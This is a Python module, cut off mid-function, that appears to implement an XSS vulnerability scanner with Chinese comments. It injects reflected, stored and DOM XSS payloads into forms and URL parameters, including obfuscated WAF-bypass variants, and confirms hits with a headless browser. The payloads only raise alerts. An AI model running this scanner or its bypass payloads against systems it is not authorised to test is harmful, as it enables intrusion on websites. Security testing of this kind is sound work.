#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
XSS扫描器模块，负责扫描XSS漏洞
"""

import re
import logging
import random
import string
import time
import base64
from urllib.parse import urlparse, urlencode, parse_qsl, unquote
from bs4 import BeautifulSoup

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from xss_scanner.utils.tech_detector import TechDetector

logger = logging.getLogger('xss_scanner')

class XSSScanner:
    """XSS扫描器类，负责扫描XSS漏洞"""
    
    def __init__(self, http_client, payload_level=2, use_browser=False):
        """
        初始化XSS扫描器
        
        Args:
            http_client: HTTP客户端对象
            payload_level: Payload复杂度级别，1-基础，2-标准，3-高级
            use_browser: 是否使用真实浏览器检测
        """
        self.http_client = http_client
        self.payload_level = payload_level
        self.use_browser = use_browser and SELENIUM_AVAILABLE
        self.driver = None
        
        # 初始化技术检测器
        self.tech_detector = TechDetector()
        
        # 存储检测到的技术信息
        self.tech_info = {
            'frontend': [],
            'backend': [],
            'server': [],
            'waf': []
        }
        
        # 初始化浏览器
        if self.use_browser:
            self._init_browser()
            
        # 随机生成的标记，用于检测XSS漏洞
        self.xss_mark = self._generate_random_string(8)
        
        # 加载XSS Payload
        self.payloads = self._load_payloads()
        
        # 加载WAF绕过Payload
        self.waf_bypass_payloads = self._load_payloads_from_file('xss_waf_bypass.txt')
    
    def _init_browser(self):
        """初始化浏览器"""
        if not SELENIUM_AVAILABLE:
            logger.warning("未安装Selenium，无法使用浏览器功能")
            self.use_browser = False
            return
            
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-notifications')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            logger.info("浏览器初始化成功")
        except Exception as e:
            logger.error(f"浏览器初始化失败: {str(e)}")
            self.use_browser = False
    
    def _load_payloads(self):
        """
        加载XSS Payload
        
        Returns:
            list: XSS Payload列表
        """
        # 尝试从文件加载Payload
        filename = f"xss_level{self.payload_level}.txt"
        file_payloads = self._load_payloads_from_file(filename)
        
        if file_payloads:
            return file_payloads
        
        # 如果文件加载失败，则使用内置的Payload
        # 基础XSS Payload，适用于所有场景
        basic_payloads = [
            f"<script>alert('{self.xss_mark}')</script>",
            f"<img src=x onerror=alert('{self.xss_mark}')>",
            f"<svg onload=alert('{self.xss_mark}')>",
            f"<body onload=alert('{self.xss_mark}')>",
            f"<iframe onload=alert('{self.xss_mark}')></iframe>",
            f"javascript:alert('{self.xss_mark}')",
            f"<input autofocus onfocus=alert('{self.xss_mark}')>",
            f"<select autofocus onfocus=alert('{self.xss_mark}')>",
            f"<textarea autofocus onfocus=alert('{self.xss_mark}')>",
            f"<keygen autofocus onfocus=alert('{self.xss_mark}')>",
            f"<video><source onerror=alert('{self.xss_mark}')>",
            f"<audio src=x onerror=alert('{self.xss_mark}')>",
            f"><script>alert('{self.xss_mark}')</script>",
            f"\"><script>alert('{self.xss_mark}')</script>",
            f"'><script>alert('{self.xss_mark}')</script>",
            f"><img src=x onerror=alert('{self.xss_mark}')>"
        ]
        
        # 标准XSS Payload，用于绕过简单的防护
        standard_payloads = [
            f"<script>alert(String.fromCharCode(88,83,83,77,65,82,75))</script>".replace("XSSMARK", self.xss_mark),
            f"<img src=x oneonerrorrror=alert('{self.xss_mark}')>",
            f"<sCRipT>alert('{self.xss_mark}')</sCriPt>",
            f"<script/x>alert('{self.xss_mark}')</script>",
            f"<script ~~~>alert('{self.xss_mark}')</script ~~~>",
            f"<script>setTimeout('alert(\\'{self.xss_mark}\\')',0)</script>",
            f"<svg/onload=alert('{self.xss_mark}')>",
            f"<svg><script>alert('{self.xss_mark}')</script>",
            f"<svg><animate onbegin=alert('{self.xss_mark}') attributeName=x dur=1s>",
            f"<svg><a><animate attributeName=href values=javascript:alert('{self.xss_mark}') /><text x=20 y=20>Click Me</text></a>",
            f"<svg><script xlink:href=data:,alert('{self.xss_mark}') />",
            f"<math><maction actiontype=statusline xlink:href=javascript:alert('{self.xss_mark}')>Click</maction></math>",
            f"<iframe src=javascript:alert('{self.xss_mark}')></iframe>",
            f"<object data=javascript:alert('{self.xss_mark}')></object>",
            f"<embed src=javascript:alert('{self.xss_mark}')></embed>",
            f"<link rel=import href=data:text/html;base64,{base64.b64encode(f'<script>alert(\'{self.xss_mark}\')</script>'.encode()).decode()}>",
            f"<x contenteditable onblur=alert('{self.xss_mark}')>lose focus!</x>",
            f"<style>@keyframes x{{}}*{{}}50%{{background:url('javascript:alert(\"{self.xss_mark}\")')}}</style><div style=animation-name:x>",
            f"<sVg OnLoAd=alert('{self.xss_mark}')>",
            f"<img src=`x`onerror=alert('{self.xss_mark}')>",
            f"<img src='x'onerror=alert('{self.xss_mark}')>",
            f"<img src=\"x\"onerror=alert('{self.xss_mark}')>"
        ]
        
        # 高级XSS Payload，用于绕过复杂的防护
        advanced_payloads = [
            f"<script>eval(atob('{base64.b64encode(f'alert(\'{self.xss_mark}\')'.encode()).decode()}'))</script>",
            f"<script>setTimeout(()=>{{eval(atob('{base64.b64encode(f'alert(\'{self.xss_mark}\')'.encode()).decode()}'))}})</script>",
            f"<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27{self.xss_mark}\\x27\\x29')</script>",
            f"<script>window['al'+'ert']('{self.xss_mark}')</script>",
            f"<script>var a='al',b='ert';window[a+b]('{self.xss_mark}')</script>",
            f"<svg><script>123<1>alert('{self.xss_mark}')</script>",
            f"<svg><script>{{\\n}}alert('{self.xss_mark}')</script>",
            f"<a href=javascript&colon;alert&lpar;'{self.xss_mark}'&rpar;>Click</a>",
            f"<svg><animate onbegin=alert('{self.xss_mark}') attributeName=x></svg>",
            f"<div style=width:1000px;overflow:hidden;>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror=alert('{self.xss_mark}')>",
            f"<img src=1 onerror=alert({self._to_js_string(self.xss_mark)})>",
            f"<script>onerror=alert;throw'{self.xss_mark}';</script>",
            f"<script>[].filter.call(1,alert,'{self.xss_mark}')</script>",
            f"<script>Object.defineProperties(window, {{get onerror(){{return {{handleEvent: function(){{alert('{self.xss_mark}');}}}};}}}});throw 'test';</script>",
            f"<script>({{}}).constructor.constructor('alert(\\'{self.xss_mark}\\')')();</script>",
            f"<script>String.prototype.replace.call('xss','ss',(_,__)=>eval('aler'+'t(`{self.xss_mark}`)'))</script>",
            f"<script>location='javascript:alert(\\'{self.xss_mark}\\');</script>",
            f"<iframe srcdoc=\"<script>parent.alert('{self.xss_mark}')</script>\"></iframe>",
            f"<script>[]['\\\140cons\\\140'+'tru\\\143tor']('\\\141\\\154\\\145\\\162\\\164\\\50\\\47{self.xss_mark}\\\47\\\51')();</script>",
            f"<form id='xss'><input name='action' value='alert(\"{self.xss_mark}\")'></form><svg><use href='#xss' /></svg>",
            f"<img src=x:alert('{self.xss_mark}') onerror=eval(src)>",
            f"<script src='data:text/javascript,alert(\"{self.xss_mark}\")'></script>",
            f"<object data='data:text/html;base64,{base64.b64encode(f"<script>alert('{self.xss_mark}')</script>".encode()).decode()}'></object>",
            f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{self.xss_mark}')\">",
            f"<iframe src=\"javascript:alert('{self.xss_mark}')\"></iframe>",
            f"<form><button formaction=javascript:alert('{self.xss_mark}')>click</button></form>"
        ]
        
        # 根据Payload级别返回对应的Payload列表
        if self.payload_level == 1:
            return basic_payloads
        elif self.payload_level == 2:
            return basic_payloads + standard_payloads
        else:
            return basic_payloads + standard_payloads + advanced_payloads
    
    def _load_payloads_from_file(self, filename, default_payloads=None):
        """
        从文件中加载Payload
        
        Args:
            filename: Payload文件名
            default_payloads: 默认Payload列表
            
        Returns:
            list: Payload列表
        """
        import os
        
        # 获取当前模块所在目录
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # 构建Payload文件路径
        payloads_dir = os.path.join(os.path.dirname(os.path.dirname(current_dir)), 'payloads', 'xss')
        
        # 如果目录不存在，则创建
        if not os.path.exists(payloads_dir):
            try:
                os.makedirs(payloads_dir)
            except Exception as e:
                logger.error(f"创建Payload目录失败: {str(e)}")
                return default_payloads
        
        payload_file = os.path.join(payloads_dir, filename)
        
        # 如果文件不存在，则返回默认Payload
        if not os.path.exists(payload_file):
            logger.warning(f"Payload文件不存在: {payload_file}")
            return default_payloads
        
        try:
            # 读取Payload文件
            payloads = []
            with open(payload_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    # 忽略空行和注释
                    if not line or line.startswith('#'):
                        continue
                    # 替换Payload中的占位符
                    line = line.replace('XSS_MARK', self.xss_mark)
                    line = line.replace('XSSMARK', self.xss_mark)
                    line = line.replace('1', self.xss_mark)
                    payloads.append(line)
            
            logger.info(f"从{payload_file}加载了{len(payloads)}个Payload")
            return payloads
        except Exception as e:
            logger.error(f"加载Payload文件失败: {str(e)}")
            return default_payloads
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的XSS漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描表单字段: {field.get('name')} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 生成唯一的XSS标记
        original_xss_mark = self.xss_mark
        self.xss_mark = self._generate_random_string()
        
        # 首先发送一个测试请求，用于检测XSS注入点的上下文
        test_form_data = {}
        for f in form.get('fields', []):
            if f.get('name'):
                if f['name'] == field['name']:
                    test_form_data[f['name']] = f"XSS_CONTEXT_TEST_{self.xss_mark}"
                else:
                    test_form_data[f['name']] = f.get('value', '')
        
        # 发送测试请求
        try:
            if method == 'POST':
                test_response = self.http_client.post(action_url, data=test_form_data)
            else:
                test_response = self.http_client.get(action_url, params=test_form_data)
                
            # 检测XSS注入点的上下文
            context = self._detect_context(test_response, f"XSS_CONTEXT_TEST_{self.xss_mark}")
            logger.info(f"检测到XSS注入点上下文: {context}")
            
            # 获取针对特定上下文的有效载荷
            context_payloads = self._get_context_specific_payloads(context)
            
            # 获取针对特定WAF的绕过Payload
            waf_payloads = self._get_waf_bypass_payloads()
            
            # 合并标准Payload、上下文特定Payload和WAF绕过Payload
            all_payloads = self.payloads + context_payloads + waf_payloads
            
            # 构建表单数据
            for payload in all_payloads:
                form_data = {}
                
                # 填充所有字段
                for f in form.get('fields', []):
                    if f.get('name'):
                        # 如果是目标字段，则使用Payload
                        if f['name'] == field['name']:
                            form_data[f['name']] = payload
                        else:
                            # 否则使用默认值
                            form_data[f['name']] = f.get('value', '')
                
                # 提交表单
                try:
                    logger.debug(f"测试Payload: {payload}")
                    
                    if method == 'POST':
                        response = self.http_client.post(action_url, data=form_data)
                    else:
                        response = self.http_client.get(action_url, params=form_data)
                    
                    # 检查响应中是否存在XSS
                    if response and self._check_xss_in_response(response, payload):
                        # 还原原始XSS标记
                        xss_mark = self.xss_mark
                        self.xss_mark = original_xss_mark
                        
                        return {
                            'type': 'XSS',
                            'subtype': 'Reflected XSS',
                            'url': url,
                            'form_action': action_url,
                            'form_method': method,
                            'parameter': field['name'],
                            'payload': payload,
                            'context': context,
                            'severity': '高',
                            'description': f"在表单字段'{field['name']}'中发现XSS漏洞",
                            'details': {
                                "表单操作": action_url,
                                "表单方法": method,
                                "漏洞字段": field['name'],
                                "有效载荷": payload,
                                "注入上下文": context,
                                "技术栈": str(self.tech_info)
                            },
                            'recommendation': "过滤用户输入，使用适当的输出编码，实施内容安全策略(CSP)，考虑使用现代框架的XSS保护"
                        }
                except Exception as e:
                    logger.error(f"测试Payload时发生错误: {str(e)}")
                    
        except Exception as e:
            logger.error(f"扫描表单时发生错误: {str(e)}")
            
        # 还原原始XSS标记
        self.xss_mark = original_xss_mark
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的XSS漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        logger.debug(f"扫描URL参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 生成唯一的XSS标记
        original_xss_mark = self.xss_mark
        self.xss_mark = self._generate_random_string()
        
        # 首先发送一个测试请求，用于检测XSS注入点的上下文
        test_params = query_params.copy()
        test_params[param] = f"XSS_CONTEXT_TEST_{self.xss_mark}"
        
        # 发送测试请求
        try:
            test_response = self.http_client.get(f"{base_url}?{urlencode(test_params)}")
            
            # 检测XSS注入点的上下文
            context = self._detect_context(test_response, f"XSS_CONTEXT_TEST_{self.xss_mark}")
            logger.info(f"检测到XSS注入点上下文: {context}")
            
            # 获取针对特定上下文的有效载荷
            context_payloads = self._get_context_specific_payloads(context)
            
            # 获取针对特定WAF的绕过Payload
            waf_payloads = self._get_waf_bypass_payloads()
            
            # 合并标准Payload、上下文特定Payload和WAF绕过Payload
            all_payloads = self.payloads + context_payloads + waf_payloads
            
            # 测试每个Payload
            for payload in all_payloads:
                try:
                    # 构建注入参数
                    inject_params = query_params.copy()
                    inject_params[param] = payload
                    
                    logger.debug(f"测试Payload: {payload}")
                    
                    # 发送注入请求
                    response = self.http_client.get(f"{base_url}?{urlencode(inject_params)}")
                    
                    # 检查响应中是否存在XSS
                    if response and self._check_xss_in_response(response, payload):
                        # 还原原始XSS标记
                        xss_mark = self.xss_mark
                        self.xss_mark = original_xss_mark
                        
                        return {
                            'type': 'XSS',
                            'subtype': 'Reflected XSS',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'context': context,
                            'severity': '高',
                            'description': f"在URL参数'{param}'中发现XSS漏洞",
                            'details': {
                                "URL": url,
                                "漏洞参数": param,
                                "有效载荷": payload,
                                "注入上下文": context,
                                "技术栈": str(self.tech_info)
                            },
                            'recommendation': "过滤用户输入，使用适当的输出编码，实施内容安全策略(CSP)，考虑使用现代框架的XSS保护"
                        }
                except Exception as e:
                    logger.error(f"测试Payload时发生错误: {str(e)}")
        except Exception as e:
            logger.error(f"扫描参数时发生错误: {str(e)}")
            
        # 还原原始XSS标记
        self.xss_mark = original_xss_mark
        return None
    
    def scan_dom(self, url):
        """
        扫描DOM型XSS漏洞
        
        Args:
            url: 页面URL
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not self.use_browser or not self.driver:
            logger.debug("浏览器未初始化，无法扫描DOM型XSS")
            return None
            
        logger.info(f"扫描DOM型XSS: {url}")
        
        # 检测目标技术栈
        self._detect_technology(url)
        
        # DOM XSS常见的危险源和接收器
        dangerous_sources = [
            # 网址/位置相关
            'document.URL', 'document.documentURI', 'document.URLUnencoded', 'document.baseURI',
            'location', 'location.href', 'location.search', 'location.hash', 'location.pathname',
            
            # 存储相关
            'localStorage', 'sessionStorage', 
            
            # 文档/cookie相关
            'document.cookie', 'document.referrer',
            
            # 窗口相关
            'window.name', 'history.pushState', 'history.replaceState',
            
            # 消息传递
            'postMessage', 'onmessage', 'addEventListener("message"', 
            
            # 跨域通信
            'XMLHttpRequest', 'fetch', 'jQuery.ajax', '$.ajax',
            
            # 框架特定
            'eval', 'setTimeout', 'setInterval', 'Function', 
            'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
            'insertAdjacentHTML', 'execScript',
            
            # 现代框架源
            'dangerouslySetInnerHTML', 'v-html', 'ng-bind-html'
        ]
        
        # DOM XSS常见的危险接收器
        dangerous_sinks = [
            # HTML操作
            'innerHTML', 'outerHTML', 'document.write', 'document.writeln', 'insertAdjacentHTML',
            
            # JavaScript执行
            'eval', 'setTimeout', 'setInterval', 'Function', 'execScript',
            
            # URL操作
            'location', 'location.href', 'location.replace', 'location.assign', 'location.pathname',
            'open', 'element.src', 'postMessage',
            
            # 框架特定
            'dangerouslySetInnerHTML', 'v-html', 'ng-bind-html', 'bypassSecurityTrust'
        ]
        
        # 先尝试检测页面中是否存在可能的DOM XSS
        try:
            # 加载页面
            self.driver.get(url)
            time.sleep(2)  # 给页面一些加载和执行的时间
            
            # 检查页面中是否存在危险的源和接收器
            vulnerable_sources_found = []
            vulnerable_sinks_found = []
            
            # 使用JavaScript检查危险源和接收器
            source_sink_check_result = self.driver.execute_script("""
                var results = {
                    'sources': [],
                    'sinks': [],
                    'source_to_sink': [],
                    'event_handlers': [],
                    'url_based_sources': []
                };
                
                // 捕获页面中的JavaScript源代码进行分析
                var allScripts = document.querySelectorAll('script');
                var allScriptContents = Array.from(allScripts)
                    .filter(script => !script.src)  // 仅使用内联脚本
                    .map(script => script.textContent)
                    .join('\\n');
                
                // 分析源 
                var sources = arguments[0];
                for (var i = 0; i < sources.length; i++) {
                    if (allScriptContents.indexOf(sources[i]) !== -1) {
                        results.sources.push(sources[i]);
                    }
                }
                
                // 分析接收器
                var sinks = arguments[1];
                for (var i = 0; i < sinks.length; i++) {
                    if (allScriptContents.indexOf(sinks[i]) !== -1) {
                        results.sinks.push(sinks[i]);
                    }
                }
                
                // 检测URL参数可能直接输入到危险接收器
                try {
                    var urlParams = new URLSearchParams(window.location.search);
                    for (var param of urlParams) {
                        var paramName = param[0];
                        var paramValue = param[1];
                        
                        // 在JavaScript中查找对URL参数的引用
                        if (allScriptContents.indexOf(paramName) !== -1) {
                            // 检查是否有参数值直接传入危险接收器
                            for (var i = 0; i < sinks.length; i++) {
                                var sink = sinks[i];
                                if (allScriptContents.indexOf(paramName + "." + sink) !== -1 ||
                                    allScriptContents.indexOf(paramName + "['" + sink + "']") !== -1 ||
                                    allScriptContents.indexOf(paramName + '["' + sink + '"]') !== -1) {
                                    results.url_based_sources.push({
                                        'param': paramName,
                                        'sink': sink
                                    });
                                }
                            }
                        }
                    }
                } catch (e) {
                    console.error("URL参数分析出错", e);
                }
                
                // 检查流向
                for (var i = 0; i < results.sources.length; i++) {
                    var source = results.sources[i];
                    for (var j = 0; j < results.sinks.length; j++) {
                        var sink = results.sinks[j];
                        // 简单检查源到接收器的数据流
                        if (allScriptContents.indexOf(source + "." + sink) !== -1 ||
                            allScriptContents.indexOf(source + " " + sink) !== -1 ||
                            allScriptContents.indexOf(sink + "(" + source) !== -1) {
                            results.source_to_sink.push({
                                'source': source,
                                'sink': sink
                            });
                        }
                    }
                }
                
                // 检查事件处理程序
                var allElements = document.querySelectorAll('*');
                var eventAttributes = ['onclick', 'onload', 'onmouseover', 'onerror',
                                     'onfocus', 'onblur', 'onkeyup', 'onkeydown',
                                     'onchange', 'onsubmit', 'onreset', 'onselect'];
                
                for (var i = 0; i < allElements.length; i++) {
                    var element = allElements[i];
                    for (var j = 0; j < eventAttributes.length; j++) {
                        var attr = eventAttributes[j];
                        if (element.hasAttribute(attr)) {
                            var attrValue = element.getAttribute(attr);
                            // 检查事件处理程序是否使用了危险接收器或者直接来自URL参数
                            for (var k = 0; k < sinks.length; k++) {
                                var sink = sinks[k];
                                if (attrValue.indexOf(sink) !== -1) {
                                    results.event_handlers.push({
                                        'element': element.tagName,
                                        'event': attr,
                                        'value': attrValue,
                                        'sink': sink
                                    });
                                }
                            }
                            
                            try {
                                var urlParams = new URLSearchParams(window.location.search);
                                for (var param of urlParams) {
                                    var paramName = param[0];
                                    if (attrValue.indexOf(paramName) !== -1) {
                                        results.event_handlers.push({
                                            'element': element.tagName,
                                            'event': attr,
                                            'value': attrValue,
                                            'urlParam': paramName
                                        });
                                    }
                                }
                            } catch (e) {}
                        }
                    }
                }
                
                return results;
            """, dangerous_sources, dangerous_sinks)
            
            # 如果找到了可能的DOM XSS漏洞
            if (source_sink_check_result['sources'] or 
                source_sink_check_result['sinks'] or 
                source_sink_check_result['source_to_sink'] or
                source_sink_check_result['event_handlers'] or
                source_sink_check_result['url_based_sources']):
                
                logger.info(f"发现可能的DOM XSS：{source_sink_check_result}")
                
                # 现在尝试用XSS有效载荷确认漏洞
                confirmed = False
                confirmation_payload = None
                confirmation_param = None
                
                # 解析URL查询参数
                parsed_url = urlparse(url)
                query_params = dict(parse_qsl(parsed_url.query))
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                
                # 对每个URL参数尝试注入XSS有效载荷
                for param in query_params.keys():
                    # 尝试多种DOM XSS有效载荷
                    dom_xss_payloads = [
                        f"<img src=x onerror=alert('{self.xss_mark}')>",
                        f"'-alert('{self.xss_mark}')-'",
                        f"\\'-alert('{self.xss_mark}')-\\'",
                        f"javascript:alert('{self.xss_mark}')",
                        f"';alert('{self.xss_mark}');//",
                        f"\";alert('{self.xss_mark}');//",
                        f"')alert('{self.xss_mark}');//",
                        f"\")alert('{self.xss_mark}');//",
                        f"</script><img src=x onerror=alert('{self.xss_mark}')>",
                        f"{{}};alert('{self.xss_mark}')"
                    ]
                    
                    for payload in dom_xss_payloads:
                        try:
                            # 构建注入参数
                            test_params = query_params.copy()
                            test_params[param] = payload
                            
                            # 构建测试URL
                            test_url = f"{base_url}?{urlencode(test_params)}"
                            
                            # 访问测试URL
                            self.driver.get(test_url)
                            time.sleep(1)  # 给页面一些加载和执行的时间
                            
                            # 检查是否有弹窗
                            try:
                                alert = self.driver.switch_to.alert
                                alert_text = alert.text
                                alert.dismiss()
                                
                                if self.xss_mark in alert_text:
                                    confirmed = True
                                    confirmation_payload = payload
                                    confirmation_param = param
                                    break
                            except:
                                # 如果没有弹窗，也可能XSS是通过DOM修改而不是alert触发的
                                page_source = self.driver.page_source
                                if self.xss_mark in page_source:
                                    confirmed = True
                                    confirmation_payload = payload
                                    confirmation_param = param
                                    break
                        except Exception as e:
                            logger.debug(f"DOM XSS确认测试出错: {str(e)}")
                            
                    if confirmed:
                        break
                
                # 无论是否确认了DOM XSS，都返回可能的漏洞信息
                return {
                    'type': 'XSS',
                    'subtype': 'DOM XSS',
                    'url': url,
                    'parameter': confirmation_param if confirmed else None,
                    'payload': confirmation_payload if confirmed else None,
                    'severity': '高' if confirmed else '中',
                    'description': "确认存在DOM XSS漏洞" if confirmed else "可能存在DOM XSS漏洞",
                    'details': {
                        "URL": url,
                        "危险源": source_sink_check_result['sources'],
                        "危险接收器": source_sink_check_result['sinks'],
                        "源到接收器流": source_sink_check_result['source_to_sink'],
                        "可疑事件处理": source_sink_check_result['event_handlers'],
                        "URL参数流向": source_sink_check_result['url_based_sources'],
                        "确认状态": "已确认" if confirmed else "未确认",
                        "确认参数": confirmation_param if confirmed else None,
                        "确认有效载荷": confirmation_payload if confirmed else None,
                        "技术栈": str(self.tech_info)
                    },
                    'recommendation': "避免使用eval、document.write等危险函数，不要将不可信数据直接插入到HTML或JavaScript中，使用DOMPurify等库过滤输入，启用CSP策略。"
                }
                
        except TimeoutException:
            logger.warning(f"页面加载超时: {url}")
        except WebDriverException as e:
            logger.error(f"浏览器发生错误: {str(e)}")
        except Exception as e:
            logger.error(f"扫描DOM XSS时发生错误: {str(e)}")
            
        return None
    
    def scan_stored_xss(self, url, form, field, verify_url):
        """
        扫描存储型XSS漏洞
        
        Args:
            url: 提交表单的URL
            form: 表单信息
            field: 字段信息
            verify_url: 验证URL
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        logger.debug(f"扫描存储型XSS: {field.get('name')} @ {url}, 验证URL: {verify_url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 首先检测目标技术栈
        self._detect_technology(url)
        
        # 获取针对特定WAF的绕过Payload
        waf_payloads = self._get_waf_bypass_payloads()
        
        # 合并标准Payload和WAF绕过Payload
        all_payloads = self.payloads + waf_payloads
        
        # 构建表单数据
        for payload in all_payloads:
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 提交表单
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查表单提交后，访问验证URL是否包含Payload
                verify_response = self.http_client.get(verify_url)
                if not verify_response:
                    continue
                    
                # 检查响应中是否包含Payload
                if self._check_xss_in_response(verify_response, payload):
                    return {
                        'type': 'XSS',
                        'subtype': 'Stored XSS',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现存储型XSS漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在存储型XSS漏洞，可以执行任意JavaScript代码",
                        'recommendation': "对用户输入进行过滤和编码，使用安全的前端框架，启用CSP策略"
                    }
            except Exception as e:
                logger.error(f"扫描存储型XSS时发生错误: {str(e)}")
                
        return None
    
    def _detect_technology(self, url):
        """
        检测网站使用的技术栈
        
        Args:
            url: 目标URL
        """
        try:
            # 发送请求
            response = self.http_client.get(url)
            if not response:
                return
                
            # 使用技术检测器检测
            self.tech_info = self.tech_detector.detect(response)
            
            frameworks = ", ".join(self.tech_info.get('frontend', []))
            backends = ", ".join(self.tech_info.get('backend', []))
            servers = ", ".join(self.tech_info.get('server', []))
            wafs = ", ".join(self.tech_info.get('waf', []))
            
            if frameworks:
                logger.info(f"检测到前端框架: {frameworks}")
            if backends:
                logger.info(f"检测到后端技术: {backends}")
            if servers:
                logger.info(f"检测到服务器: {servers}")
            if wafs:
                logger.info(f"检测到WAF: {wafs}")
                
                # 获取WAF绕过技术
                bypass_techniques = self.tech_detector.get_waf_bypass_techniques(self.tech_info.get('waf', []))
                for waf, techniques in bypass_techniques.items():
                    logger.info(f"可能的{waf} WAF绕过技术:")
                    for i, technique in enumerate(techniques, 1):
                        logger.info(f"  {i}. {technique}")
        except Exception as e:
            logger.error(f"检测技术栈时发生错误: {str(e)}")
    
    def _get_waf_bypass_payloads(self):
        """
        根据检测到的WAF，获取对应的绕过Payload
        
        Returns:
            list: 绕过Payload列表
        """
        if not self.tech_info.get('waf'):
            return []
            
        # 使用WAF绕过专用的Payload
        if self.waf_bypass_payloads:
            return self.waf_bypass_payloads
            
        # 如果没有预加载的WAF绕过Payload，则返回空列表
        return []
    
    def _check_xss_in_response(self, response, payload):
        """
        检查响应中是否包含XSS Payload
        
        Args:
            response: 响应对象
            payload: XSS Payload
            
        Returns:
            bool: 是否包含Payload
        """
        # 如果响应为空，则返回False
        if not response or not response.text:
            return False
            
        # 检查响应中是否包含XSS标记
        if self.xss_mark in response.text:
            return True
            
        # 解析响应内容
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 检查是否存在alert弹窗（仅在使用浏览器时有效）
            if self.use_browser and self.driver:
                try:
                    self.driver.get("data:text/html;charset=utf-8," + response.text)
                    time.sleep(1)
                    
                    # 检查是否有弹窗
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.dismiss()
                    
                    if self.xss_mark in alert_text:
                        return True
                except:
                    pass
                    
                # 额外检查DOM变化
                try:
                    # 执行JavaScript检查DOM是否有变化
                    has_xss = self.driver.execute_script(f"""
                        return (function() {{
                            var hasXSS = false;
                            
                            // 检查是否有新添加的脚本标签
                            var scripts = document.querySelectorAll('script');
                            for (var i = 0; i < scripts.length; i++) {{
                                if (scripts[i].textContent.includes('{self.xss_mark}')) {{
                                    hasXSS = true;
                                    break;
                                }}
                            }}
                            
                            // 检查是否有包含XSS标记的DOM节点
                            var elements = document.querySelectorAll('*');
                            for (var i = 0; i < elements.length; i++) {{
                                // 检查元素内容
                                if (elements[i].innerText && elements[i].innerText.includes('{self.xss_mark}')) {{
                                    hasXSS = true;
                                    break;
                                }}
                                
                                // 检查属性值
                                var attrs = elements[i].attributes;
                                for (var j = 0; j < attrs.length; j++) {{
                                    if (attrs[j].value.includes('{self.xss_mark}')) {{
                                        hasXSS = true;
                                        break;
                                    }}
                                }}
                            }}
                            
                            // 检查框架XSS（React、Vue等）
                            if (window.React || window._REACT_DEVTOOLS_GLOBAL_HOOK_ || 
                                window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || 
                                document.querySelector('[data-reactroot]')) {{
                                // React应用
                                try {{
                                    var reactElements = document.querySelectorAll('*');
                                    for (var i = 0; i < reactElements.length; i++) {{
                                        var reactInstance = reactElements[i].__reactInternalInstance$ || 
                                                        reactElements[i]._reactInternalInstance ||
                                                        reactElements[i]._reactInternalFiber;
                                        if (reactInstance && 
                                            JSON.stringify(reactInstance).includes('{self.xss_mark}')) {{
                                            hasXSS = true;
                                            break;
                                        }}
                                    }}
                                }} catch (e) {{}}
                            }}
                            
                            if (window.Vue || window.__VUE_DEVTOOLS_GLOBAL_HOOK__) {{
                                // Vue应用
                                try {{
                                    var vueElements = document.querySelectorAll('*');
                                    for (var i = 0; i < vueElements.length; i++) {{
                                        var vueInstance = vueElements[i].__vue__ || vueElements[i].__vue_app__;
                                        if (vueInstance && 
                                            JSON.stringify(vueInstance).includes('{self.xss_mark}')) {{
                                            hasXSS = true;
                                            break;
                                        }}
                                    }}
                                }} catch (e) {{}}
